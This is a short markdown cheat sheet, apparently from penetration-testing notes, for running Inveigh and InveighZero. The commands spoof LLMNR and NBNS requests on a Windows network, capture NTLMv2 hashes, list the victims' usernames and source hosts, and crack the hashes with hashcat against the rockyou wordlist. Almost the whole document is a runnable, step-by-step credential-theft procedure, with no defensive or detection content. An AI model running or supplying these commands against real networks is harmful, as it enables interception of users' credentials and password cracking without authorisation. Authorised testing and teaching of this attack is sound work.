---
legal-banner: true
---

### **RUNNING INVEIGH IN POWERSHELL**

1.  Load the Inveigh module into PowerShell:  
    `Import-Module .\Inveigh.ps1`
2.  Check the available parameters for the Invoke-Inveigh cmdlet to understand its options.  
    `(Get-Command Invoke-Inveigh).Parameters`
3.  Run Inveigh to start spoofing LLMNR and NBNS requests, with console and file output enabled.  
    `Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y`

### **USING INVEIGHZERO (C# VERSION)**

1.  Run the C# version of Inveigh:  
    `.\Inveigh.exe`
2.  Interactive Console  
    Press `ESC` to enter the interactive console.
3.  Use the following commands within the interactive console to get specific information:
4.  Get one captured NTLMv2 hash per user:  
    `GET NTLMV2UNIQUE`
5.  Get usernames and source IPs/hostnames:  
    `GET NTLMV2USERNAMES`

### **STEP-BY-STEP ATTACK EXECUTION**

1.  Start Inveigh with Default Settings:  
    `Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
2.  Use the console commands to check captured hashes and usernames.
3.  Captured hashes are stored in the specified output directory. By default, they are saved in `C:\Tools`.
4.  Prepare Hashes for Cracking Ensure the hashes are in a compatible format for Hashcat.
5.  Run Hashcat:  
    `hashcat -m 5600 hash_file.txt /usr/share/wordlists/rockyou.txt`